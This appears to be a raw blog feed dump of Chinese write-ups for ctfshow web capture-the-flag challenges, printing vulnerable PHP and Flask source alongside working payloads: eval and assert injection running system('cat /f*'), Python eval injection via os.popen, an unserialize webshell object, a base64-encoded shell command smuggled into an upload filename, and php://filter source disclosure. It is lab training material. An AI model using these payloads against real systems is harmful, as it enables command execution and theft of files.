<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">  	res.end(flag);</span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/nodejs/nodejs-express-framework.html">Node.js Express 框架 | 菜鸟教程 (runoob.com)</a></p>
<p>payload: ?a[]&#x3D;1&amp;b&#x3D;1</p>
<h2 id="web338原型链污染"><a href="#web338原型链污染" class="headerlink" title="web338原型链污染"></a>web338原型链污染</h2>]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_菜狗杯</title>
    <url>/2023/01/08/ctfshow%E5%90%88%E9%9B%86-ctfshow-web-%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<p>  我是菜狗</p>
 <span id="more"></span>

<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>

<p>加入cookie中传入<code>CTFshow-QQ群:=a</code>那么就会出现<code>$_POST[&#39;a&#39;]</code>，假如post传入的值为<code>a=b</code>，那么就会得到<code>$_GET[&#39;b&#39;]</code>，接着假如get传入<code>b=c</code>就会得到&#96;$_REQUEST[‘c’]</p>
<p><code>?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;ls /&quot;);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]); `bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p><code>http://b931900e-462b-453b-9822-8631dc625e3e.challenge.ctf.show/?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;tac /f1a*&quot;);</code></p>
<p>ctfshow{c41273bb-5a71-44b9-9dc2-a9eaba87804d}</p>
<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>playload:</p>
<p><code>_=a1&amp;a1=a2&amp;a2=a3&amp;a3=a4&amp;a4=a5&amp;a5=a6&amp;a6=a7&amp;a7=a8&amp;a8=a9&amp;a9=a10&amp;a10=a11&amp;a11=a12&amp;a12=a15&amp;a15=a16&amp;a16=a17&amp;a17=a18&amp;a18=a19&amp;a19=a20&amp;a20=a21&amp;a21=a22&amp;a22=a23&amp;a23=a24&amp;a24=a25&amp;a25=a26&amp;a26=a27&amp;a27=a28&amp;a28=a29&amp;a29=a30&amp;a30=a31&amp;a31=a32&amp;a32=a33&amp;a33=a34&amp;a34=a35&amp;a35=a36&amp;a36=a37&amp;a37=system(&#39;ls /&#39;);</code></p>
<p><code>bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr var &lt;?php</code></p>
<p><code>=system(&#39;cat /f*&#39;);</code></p>
<p><code>ctfshow&#123;e1b2ed6c-fbb8-4c73-876e-ec6a41950797&#125;</code></p>
<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>playload: <code>?num=114514);//</code></p>
<p>就会执行里面的内容然后注释掉了后面的全部内容，输出flag</p>
<p>解法2：<code>?num=114514%2B1805296</code></p>
<p>ctfshow{10bbb32b-baae-4704-9238-8a6df82ec55a}</p>
<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">       <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法二依旧能用<code>?num=114514%2B1805296</code></p>
<p>ctfshow{59e5ece8-747c-41d3-a711-e1634f0b26f9}</p>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p>打开后是一个得分小游戏</p>
<p>检查源码在最后发现js源码，打开源码</p>
<p>base64解码后Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>访问&#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>得到ctfshow{91469515-6436-482e-8d01-bb4899c3675d}</p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0);</span><br><span class="line"></span><br><span class="line">    class Webshell &#123;</span><br><span class="line">        public $cmd = &#x27;echo &quot;Hello World!&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;init();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function init() &#123;</span><br><span class="line">            if (!preg_match(&#x27;/flag/i&#x27;, $this-&gt;cmd)) &#123;</span><br><span class="line">                $this-&gt;exec($this-&gt;cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function exec($cmd) &#123;</span><br><span class="line">            $result = shell_exec($cmd);</span><br><span class="line">            echo $result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">        $serializecmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">        $unserializecmd = unserialize($serializecmd);</span><br><span class="line">        $unserializecmd-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Webshell</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd = &#x27;cat f*&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Webshell;</span><br><span class="line">echo(serialize($a));</span><br></pre></td></tr></table></figure>



<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你太长了！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;大牛&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环输入i，中文在php里面长度是3，其实很容易想到中文的url编码就是3个</p>
<p>%E5%A4%A7%E7%89%9B</p>
<p>payload</p>
<p><code>1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code></p>
<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$arr[$_GET[‘0’]]&#x3D;1;,变量arr赋值为1；始终为true,随便给0赋值</p>
<p>payload:0&#x3D;1</p>
<p>ctfshow{8b9aed50-afa2-4988-8181-89bcf3547acb}</p>
<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>题目要求得到2077分数<br>所以查看源代码，发现js代码泄露<br>ctrl+f 搜索score这个单词是猜的，发现代码<br>由+1改为2077，ctrl+s 保存，吃一个苹果，没出来，又吃一个苹果，在控制台发现flag<br>ctfshow{Under0ph1di4n_n0!_…underrrrrta1e}</p>
<h2 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h2><p>抓包查看内容传递三个参数，随便穿一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_calculate?number1=7&amp;operator=*&amp;number2=asdf</span><br></pre></td></tr></table></figure>

<p>出现报错</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_calculate?number1=&amp;operator=&amp;number2=__import__(%27os%27).popen(%27cat%20/f*%27).read()</span><br></pre></td></tr></table></figure>

<p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2022/11/2</span><br><span class="line"># @Author  : 探姬</span><br><span class="line"># @Forkfrom:https://github.com/helloflask/calculator</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">from flask import Flask, jsonify, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/_calculate&#x27;)</span><br><span class="line">def calculate():</span><br><span class="line">    a = request.args.get(&#x27;number1&#x27;, &#x27;0&#x27;)</span><br><span class="line">    operator = request.args.get(&#x27;operator&#x27;, &#x27;+&#x27;)</span><br><span class="line">    b = request.args.get(&#x27;number2&#x27;, &#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">    m = re.match(r&#x27;^\-?\d*[.]?\d*$&#x27;, a)</span><br><span class="line">    n = re.match(r&#x27;^\-?\d*[.]?\d*$&#x27;, a)</span><br><span class="line"></span><br><span class="line">    if m is None or n is None or operator not in &#x27;+-*/&#x27;:</span><br><span class="line">        return jsonify(result=&#x27;Error!&#x27;)</span><br><span class="line"></span><br><span class="line">    if operator == &#x27;/&#x27;:</span><br><span class="line">        result = eval(a + operator + str(float(b)))</span><br><span class="line">    else:</span><br><span class="line">        result = eval(a + operator + b)</span><br><span class="line">    return jsonify(result=result)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hint&#x27;)</span><br><span class="line">def hint():</span><br><span class="line">    return render_template(&#x27;hint.html&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>



<h2 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h2><p>不太懂</p>
<h2 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;好多零&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?_GET=flag</span><br></pre></td></tr></table></figure>

<h2 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://9d0e268f-d218-41f1-91ea-99cc3d6f0eac.challenge.ctf.show/&quot;</span><br><span class="line">files=&#123;&quot;file&quot;:(&quot;123;echo &#x27;Y2F0IGYqICA+IHN0YXRpYy9qcy9hbnNpX3VwLmpz&#x27;|base64 -d|sh&quot;,&quot;123&quot;,&quot;image/png&quot;)&#125;</span><br><span class="line">#cat f*  &gt; static/js/ansi_up.js</span><br><span class="line">requests.post(url+&#x27;upload&#x27;,files=files)</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url+&#x27;static/js/ansi_up.js&#x27;)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br></pre></td></tr></table></figure>

<h2 id="无一幸免-FIXED"><a href="#无一幸免-FIXED" class="headerlink" title="无一幸免_FIXED"></a>无一幸免_FIXED</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class="line">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class="line">    if ($arr[]=1)&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>整形数组溢出</p>
<p><a href="https://blog.csdn.net/Win_X_/article/details/117579314">(10条消息) PHP_数组溢出分析_php 数组溢出_WinX_的博客-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0=9223372036854775807</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow终极考核</title>
    <url>/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[ <span id="more"></span>

<p>在消息头中，发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_641=ctfshow&#123;affac61c787a82cc396585bea8ecf2dc&#125;</span><br></pre></td></tr></table></figure>

<p>查看源码，发现&#x2F;system36d&#x2F;，登录，查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/static/js/lock/index.js</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230529200549.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_644=ctfshow&#123;2bb9f2183f102f6f2aedbea4788f9f1d&#125;</span><br></pre></td></tr></table></figure>

<p>搜索发现</p>
<p>this.pin&#x3D;0x36D，登录</p>
<p>网络测试里命令执行抓包改为ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure>

<p>访secret.txt,url解码，即可看见</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_643=ctfshow&#123;616cd5fc37968fc20810b2db30152717&#125;</span><br></pre></td></tr></table></figure>

<p>点击数据备份，下载，打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>

<p>打开远程在线更新抓包，</p>
<p>远程文件包含，修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>发送解密如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>!==<span class="number">99</span> &amp;&amp; <span class="variable">$user</span>!==<span class="number">10</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;1;url=login.php\&quot;&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">&#x27;你还没有登陆,请先&lt;a href=&quot;login.php&quot;&gt;登陆&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:main.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- flag_642=ctfshow&#123;<span class="number">11</span>a17b6fbdc69cedfb374f55026700fe&#125; --&gt;</span><br></pre></td></tr></table></figure>

<p>，其他源码init.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PATH&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&#x27;/db/data_you_never_know.db&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG645&#x27;</span>,<span class="string">&#x27;flag645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG646&#x27;</span>,<span class="string">&#x27;flag646=ctfshow&#123;5526710eb3ed7b4742232d6d6f9ee3a9&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//存在漏洞，未修补前注释掉</span></span><br><span class="line"><span class="comment">//include &#x27;util/common.php&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>users.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch ($a) &#123;</span><br><span class="line">   case &#x27;evilString&#x27;:</span><br><span class="line">       evilString($_GET[&#x27;m&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilNumber&#x27;:</span><br><span class="line">       evilNumber($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilFunction&#x27;:</span><br><span class="line">       evilFunction($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilArray&#x27;:</span><br><span class="line">       evilArray($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilClass&#x27;:</span><br><span class="line">       evilClass($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function evilString($m)&#123;</span><br><span class="line">    $key = &#x27;372619038&#x27;;</span><br><span class="line">    $content = call_user_func($m);  //call_user_func — 把第一个参数作为回调函数调用</span><br><span class="line">    if(stripos($content, $key)!==FALSE)&#123;   //stripos() 函数查找字符串在另一字符串中第一次出现的位置</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not 372619038?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilClass($m,$k)&#123;</span><br><span class="line">    class ctfshow&#123;</span><br><span class="line">        public $m;</span><br><span class="line">        public function construct($m)&#123;</span><br><span class="line">            $this-&gt;$m=$m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ctfshow=new ctfshow($m);</span><br><span class="line">    $ctfshow-&gt;$m=$m;</span><br><span class="line">    if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG647&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG648&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;mmmmm?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilNumber($m,$k)&#123;</span><br><span class="line">    $number = getArray(1000,20,10,999);</span><br><span class="line">    if($number[$m]==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG648&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG649&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;number is right?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilFunction($m,$k)&#123;</span><br><span class="line">    $key = &#x27;ffffffff&#x27;;</span><br><span class="line">    $content = call_user_func($m);</span><br><span class="line">    if(stripos($content, $key)!==FALSE &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG649&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG650&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not ffffffff?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilArray($m,$k)&#123;</span><br><span class="line">    $arrays=unserialize($m);</span><br><span class="line">    if($arrays!==false)&#123;</span><br><span class="line">        if(array_key_exists(&#x27;username&#x27;, $arrays) &amp;&amp; in_array(&#x27;ctfshow&#x27;, get_object_vars($arrays)) &amp;&amp;  $k==shell_exec(&#x27;cat /FLAG/FLAG650&#x27;))&#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG651&#x27;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo 